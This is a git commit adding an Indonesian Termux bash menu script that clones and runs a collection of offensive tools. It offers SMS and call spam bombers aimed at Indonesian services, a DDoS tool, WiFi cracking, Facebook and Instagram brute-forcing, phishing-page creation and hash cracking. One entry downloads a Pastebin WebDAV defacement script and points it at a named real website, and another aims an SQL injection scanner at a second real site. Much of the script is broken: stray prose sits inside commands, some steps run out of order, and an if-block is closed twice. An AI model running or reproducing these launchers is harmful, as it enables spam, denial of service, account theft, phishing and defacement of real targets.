a1c0af85594bfa76cff631b410334443f53f2914
Rusmana-ID <41493567+Rusmana-ID@users.noreply.github.com>
2018-07-29 08:00:22 +0700

    Rusmana

---
+++ rus.sh
@@ -0,0 +1,530 @@
+#!/usr/bin/bash
+#usr/bin/berkarya
+#Coders:Rusmana
+#Aku sayang kamu Reni Martini [Iren anya]
+#semoga kita bisa bertemu amiin
+
+clear
+figlet "Rusmana" | lolcat
+
+	echo """
+	\033[34;1m
+[•]=================================[•]
+"quotes :Salam Anak Bangsa"
+"Coders :Rusmana"
+"kontax :083879017166"
+"Thanks To:Mr.R|﴾ஓீ͜ঔৣ͡D4RKF19ঔৣ͡ஓீ͜ঔৣ͡﴿|minami"
+    "Hacker_alicia|Mr.McA.404"
+   "MR.J4K1 404 3ROR|xNot_Found"
+"Thanks To:Teman²Ku semua"
+"Thanks To : All member Termux Tools-ID"
+[•]=================================[•]
+	"""
+	echo """
+[+]_______________________________[+]
+===>[01] TELKOMSEL
+[+]_______________________________[+]		 
+===>[02] PHD 			
+[+]_______________________________[+]		  
+===>[03] TOKOPEDIA               
+[+]_______________________________[+]
+===>[04] Grab 			
+[+]_______________________________[+]
+===>[05] JD.ID	
+[+]_______________________________[+]	           
+===>[06] Call-Tokopedia  
+[+]_______________________________[+]       
+===>[07] BOM-Gmail	  
+[+]_______________________________[+]      
+===>[08] Laxymux  
+[+]_______________________________[+]               
+===>[09] CNK--Spam    
+[+]_______________________________[+]        
+===>[10] DDOS-HAMMER
+[+]_______________________________[+]
+===>[11] Bobol Wifi(root) 
+[+]_______________________________[+]       
+===>[12] INSTABOT 
+[+]_______________________________[+]
+===>[13] FACEBOOK BRUTERFORCE
+[+]_______________________________[+]
+===>[14] LINUX KATOLIN
+[+]_______________________________[+]
+===>[15] Menghias Termux dgn Cowsay
+[+]_______________________________[+]
+===>[16] Hack akun Instagram
+[+]_______________________________[+]
+===>[17] Bot Komen Facebook
+[+]_______________________________[+]
+===>[18] RED-HAWK
+[+]_______________________________[+]
+===>[19] Musikan di Termux
+[+]_______________________________[+]
+===>[20] Browsing Di Termux
+[+]_______________________________[+]
+===>[21] Telponan di Termux
+[+]_______________________________[+]
+===>[22] System inpormasi android
+[+]_______________________________[+]
+===>[23] kosongkan bagian atas termux
+[+]_______________________________[+]
+===>[24] Cara intall WEBSPLOIT
+[+]_______________________________[+]
+===>[25] Defface WEBDAV di Termux
+[+]_______________________________[+]
+===>[26] Hack Facebook metode MBF
+[+]_______________________________[+]
+===>[27] Install tools Mr.Rv1
+[+]_______________________________[+]
+===>[28] Install tools Mr.Rv2
+[+]_______________________________[+]
+===>[29] Cara install D-Tect Tools
+[+]_______________________________[+]
+===>[30] Cara membuat virus
+[+]_______________________________[+]
+===>[31] Crack pasword Hash MD5 1
+[+]_______________________________[+]
+===>[32] Crack pasword Hash MD5 2
+[+]_______________________________[+]
+===>[33] Install metasploit no.root
+[+]_______________________________[+]
+===>[34] SQLMAP
+[+]_______________________________[+]
+===>[35] cara melacak IP
+[+]_______________________________[+]
+===>[36] Mecanri Admin Panel/pinder
+[+]_______________________________[+]
+===>[37] Install HAKKU
+[+]_______________________________[+]
+===>[38] install Vi sql
+[+]_______________________________[+]
+===>[39] HASH BUSTER
+[+]_______________________________[+]
+===>[40] Install Routersploit
+[+]_______________________________[+]
+===>[41] Tools U-Buntu
+[+]_______________________________[+]
+===>[42] Membuat phising fb dll
+[+]_______________________________[+]
+===>[43] Install Hunner Framework
+[+]_______________________________[+]
+===>[44] Lacak IP v.2
+[+]_______________________________[+]
+===>[45] Install Tools daijobu
+[+]_______________________________[+]
+===>[00]===>[exit]<====
+[•]===================================[•]				  
+Sialahkan pilih tools yg mau di gunakan
+Gunakan dengan bijak
+""" | lolcat 
+read -p "root@rus~>Pilih no :" yo
+
+   if [ $yo = 01 ] || [ $yo = 1 ];then
+   clear
+   figlet "Rusmana" | lolcat
+   php telkomsel.php
+   fi
+   if [ $yo = 02 ] || [ $yo = 2 ];then
+   clear
+   figlet "Rusmana" | lolcat
+   php phd.php
+   fi
+   if [ $yo = 03 ] || [ $yo = 3 ];then
+   clear
+   figlet "Rusmana" | lolcat
+   php tokped.php
+   fi
+   if [ $yo = 04 ] || [ $yo = 4 ];then
+   clear
+   figlet "Rusmana" | lolcat
+   python2 spammer.py
+   fi
+   if [ $yo = 05 ] || [ $yo = 5 ];then
+   clear
+   toilet "Rusmana" | lolcat
+   php jdid.php
+   fi 
+   if [ $yo = 06 ] || [ $yo = 6 ];then
+   clear
+   toilet "Rusmana" |lolcat
+   php run.php
+   fi
+   if [ $yo = 07 ] || [ $yo = 7 ];then
+   clear
+   toilet "Rusmana" | lolcat
+   python2 lazada.py
+   fi
+   
+   if [ $yo = 08 ] || [ $yo = 8 ];then
+   apt update && apt upgrade
+   apt install git
+   git clone https://github.com/Gameye98/Lazymux
+   cd Lazymux
+   ls
+   figlet "Rusmana" | lolcat
+   python2 lazymux.py
+   fi
+   
+   if [ $yo = 09 ] || [ $yo = 9 ];then
+   apt upgrade && apt update
+   apt install git 
+   git clone https://github.com/hatakecnk/cnkspam
+   cd cnkspam
+   sh install.sh
+   sh cnk.sh
+   fi
+
+   if [ $yo = 10 ] || [ $yo = 10 ];then
+   pkg update
+   pkg upgrade
+   pkg install python
+   pkg install git
+   git clone https://github.com/cyweb/hammer
+   cd hammer
+   python hammer.py
+   fi
+   
+   if [ $yo = 11 ] || [ $yo = 11 ];then
+   apt update
+   apt upgrade
+   pkg install git
+   git clone https://github.com/hatakecnk/wifi-hacker
+   cd wifi-hacker
+   chmod +x wifi-hacker.sh
+   ./wifi-hacker.sh
+   fi
+   
+   if [ $yo = 12 ] || [ $yo = 12 ];then
+   apt update && apt upgrade -y
+   pkg install nodejs
+   git clone https://github.com/hatakecnk/INSTABOT
+   cd INSTABOT
+   unzip node_modules.zip
+   node index.js
+   fi
+   
+   if [ $yo = 13 ] || [ $yo = 13 ];then
+   apt update  
+   apt upgrade 
+   apt install python2 
+   apt install python2-dev 
+   apt install wget 
+   pip2 install mechanize
+   cd/storage/emulated/0
+   python2 fbbrute.py
+   storage/emulated/0/password.txt
+   fi
+   
+   if [ $yo = 14 ] || [ $yo = 14 ];then
+   Pkg install git
+   Pkg install python2
+   Pkg install gnupg
+   Pkg install nano
+   git clone https://github.com/LionSec/katoolin.git
+   cd  katoolin
+   nano katoolin.py
+   python2 katoolin.py
+   fi
+   
+   if [ $yo = 15 ] || [ $yo = 15 ];then
+   pkg update && pkg upgrade
+   pkg install ruby cowsay toilet figlet
+   pkg install neofetch
+   pkg install nano
+   gem install lolcat
+   cd ../usr/etc
+   nano bash.bashrc
+   fi
+   
+   if [ $yo = 16 ] || [ $yo = 16 ];then
+   apt update && apt upgrade -y
+   apt install nodejs git
+   cd Instagram-Private-Tools
+   node index.js
+   git clone https://github.com/ccocot/Instagram-Private-Tools.git
+   npm install
+   fi
+   
+   if [ $yo = 17 ] || [ $yo = 17 ];then
+   pkg update && pkg upgrade
+   pkg install git
+   pkg install python2
+   pip2 install mechanize
+   git clone https://github.com/Senitopeng/Botkomena.git
+   cd Botkomena
+   python2 botkomena.py
+   fi
+   
+   if [ $yo = 18 ] || [ $yo = 18 ];then
+   apt update
+   apt install git
+   git clone https://github.com/Tuhinshubhra/RED_HAWK
+   cd RED_HAWK
+   chmod +x rhawk.php
+   apt install php
+   ls
+   php rhawk.php
+   fi
+   
+   if [ $yo = 19 ] || [ $yo = 19 ];then
+   pkg install mpv 
+   mpv/sdcard/lagu.mp3 
+   /sdcard/music
+   fi
+   
+   if [ $yo = 20 ] || [ $yo = 20 ];then
+   pkg install w3m
+   w3m www.google.com
+   Linknya bsa diubah
+   fi
+   
+   if [ $yo = 21 ] || [ $yo = 21 ];then
+   pkg install termux-api
+   termux-telephony-call nomornya
+   fi
+   
+   if [ $yo = 22 ] || [ $yo = 22 ];then
+   pkg install neofetch
+   neofetch
+   fi
+   
+   if [ $yo = 23 ] || [ $yo = 23 ];then
+   rm -r ../usr/etc/motd
+   cp -rf BOM /$HOME && cd
+   fi
+   
+   if [ $yo = 24 ] || [ $yo = 24 ];then
+    apt update && upgrade -y
+    apt install python2
+    pip2 install scapy
+    git clone https://github.com/The404Hacking/websploit.git
+    cd websploit
+    chmod 777 *.py
+    python2 websploit.py
+
+untuk melihat module ketik:
+
+wsf > show modules
+untuk melihat command yg tersedia ketik:
+wsf > help
+    fi
+    
+    if [ $yo = 25 ] || [ $yo = 25 ];then
+    apt update && apt upgrade 
+    apt install python2 
+    pip2 install urllib3 chardet certiÚ idna requests 
+    apt install openssl curl 
+    pkg install libcurl 
+    mkdir webdav 
+    cd webdav 
+    wget https://pastebin.com/raw/HnVyQPtR 
+    mv HnVyQPtR webdav.py
+    chmod 777 webdav.py
+    termux-setup-storage
+"/data/data/com.termux/Úles/home/webdav
+    cp /sdcard/nama_script.htm ~/webdav
+    python2 webdav.py (target.cok) (nama sc depes lu)
+    python2 webdav.py http://orders.southeasternfood.com/dep
+    fi
+    
+    if [ $yo = 26 ] || [ $yo = 26 ];then
+    pkg install python2
+    pkg install git
+    git clone https://github.com/pirmansx/mbf
+    cd mbf/
+    pip2 install mechanize
+    python2 MBF.py
+    fi
+    
+    if [ $yo = 27 ] || [ $yo = 27 ];then
+    apt update && apt upgrade
+    apt install figlet
+    apt install lolcat
+    apt install git
+    git clone https://github.com/Mr-R225/Mr.Rv1
+    cd Mr.Rv1
+    sh Mr.Rv1.sh 
+    fi
+    
+    if [ $yo = 28 ] || [ $yo = 28 ];then
+    apt update
+    apt upgrade
+    apt install git
+    apt install figlet
+    gem install lolcat
+    git clone https://github.com/Mr-R225/Mr.Rv2
+    cd Mr.Rv2
+    sh Mr.Rv2.sh
+    fi
+    
+    if [ $yo = 29 ] || [ $yo = 29 ];then
+    apt install git
+    apt install python2
+    git clone https://github.com/shawarkhanethicalhacker/D-TECT
+    ls
+    cd D-TECH
+    chmod +x d-tect.py
+    python2 d-tect.py
+    fi
+    
+    if [ $yo = 30 ] || [ $yo = 30 ];then
+    cd Vbug/vbug.py
+    cd /storage/emulated/0/Vbug
+    cd vbug
+    Python2 vbug.py
+    fi
+    
+    if [ $yo = 31 ] || [ $yo = 31 ];then
+    apt update && apt upgrade
+    pkg install git
+    git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/
+    cd FHX-Hash-Killer
+    python2 FHXHashKiller.py
+    fi
+    
+    if [ $yo = 32 ] || [ $yo = 32 ];then
+    git clone https://github.com/UltimateHackers/Hash-Buster
+    cd Hash-Buster
+    python2 hash.py
+    pkg install irssi
+    irssi (enter)
+    /connect chat.freenode.net
+    /nick oki
+    /join #mrmaze
+    fi
+    
+    if [ $yo = 33 ] || [ $yo = 33 ];then
+    apt update && apt upgrade
+    apt install curl
+    curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
+    chmod +x metasploit.sh
+    ./metasploit.sh
+    fi
+
+    if [ $yo = 34 ] || [ $yo = 34 ];then
+    apt update
+    apt install python
+    apt install python2
+    apt install git
+    git clone https://github.com/sqlmapproject/sqlmap
+    cd sqlmap
+    Python2 sqlmap.py
+    fi
+    
+    if [ $yo = 35 ] || [ $yo = 35 ];then
+    apt install python git
+    git clone https://github.com/maldevel/IPGeoLocation.git
+    cd IPGeoLocation
+    chmod +x ipgeoLocation.py
+    pip install -r requirements.txt
+    python ipgeolocation.py -m
+    python ipgeolocation.py -t http://www.google.com
+    fi
+    
+    if [ $yo = 36 ] || [ $yo = 36 ];then
+    pkg install git
+    git clone https://github.com/Techzindia/admin_penal
+    cd admin_penal
+    chmod +x admin_panel_finder.py
+    python2 admin_panel_finder.py
+    fi
+    
+    if [ $yo = 37 ] || [ $yo = 37 ];then
+    apt install pytho
+    apt install git
+    mkdir vasu
+    git clone https://github.com/4shadoww/hakkuframework
+    cd hakkuframework
+    chmod +x hakku
+    python hakku
+    show modules
+    use whois
+    show options
+    set target examplesite.com
+    run
+    fi
+    
+    if [ $yo = 38 ] || [ $yo = 38 ];then
+    apt update
+    apt install python2
+    apt install git
+    git clone https://github.com/blackvkng/viSQL
+    cd viSQL
+    python2 -m pip install -r requirements.txt
+    python2 viSQL.py
+    python2 viSQL.py -t http://www.bible-history.com
+    fi
+    
+    if [ $yo = 39 ] || [ $yo = 39 ];then
+    git clone https://github.com/UltimateHackers/Hash-Buster
+    cd Hash-Buster
+    python2 hash.py
+    fi
+    
+    if [ $yo = 40 ] || [ $yo = 40 ];then
+    pip2 install requests
+    git clone https://github.com/reverse-shell/routersploit.git
+    cd routersploit
+    pip install -r requirements.txt
+    termux-fix-shebang rsf.py
+    fi
+    
+    if [ $yo = 41 ] || [ $yo = 41 ];then
+    apt update
+    apt install git
+    apt install wget
+    apt install proot
+    git clone https://github.com/Neo-Oli/termux-ubu&#8230;
+    cd termux-ubuntu
+    chmod +x ubuntu.sh
+    ./ubuntu.sh
+    ./start.sh
+    fi
+    
+    if [ $yo = 42 ] || [ $yo = 42 ];then
+    apt update && apt upgrade -y
+    apt install git -y
+    apt install python2 -y
+    git clone https://github.com/evait-security/weeman
+    cd weeman
+    chmod 777 weeman.py
+    python2 weeman.py
+    fi
+    
+    if [ $yo = 43 ] || [ $yo = 43 ];then
+    apt update 
+    apt install python
+    apt install git -y
+    git clone https://github.com/b3-v3r/Hunner
+    cd Hunner
+    chmod 777 hunner.py
+    python hunner.py
+    fi
+    
+    if [ $yo = 44 ] || [ $yo = 44 ];then
+    git clone https://github.com/maldevel/IPGeolocation
+    cd IPGeolocation
+    chmod +x ipgeolocation.py
+    pip install -r requirements.txt
+    python ipgeolocation.py -m
+    python ipgeolocation.py -t IP yang ingin dilacak
+    fi
+    
+    if [ $yo = 45 ] || [ $yo = 45 ];then
+    apt upgrade && apt update 
+    apt install php 
+    apt install git 
+    git clone https://github.com/alintamvanz/diejoubu 
+    cd diejoubu 
+    cd v1.2 
+    php diejoubu.php 
+    fi
+    sleep 3
+    clear
+    "Semoga bermanpaat dan gunakan dengan bijak :)"
+    "Jika ingin kembali lagi silahkan ketik sh rus.sh"
+    "Salam Anak Bangsa"
+    "Anak Muda Berkarya Bukan Bergaya"
+    "wasaalamu'alaikum wr.wb.." | lolcat
+    fi
+    
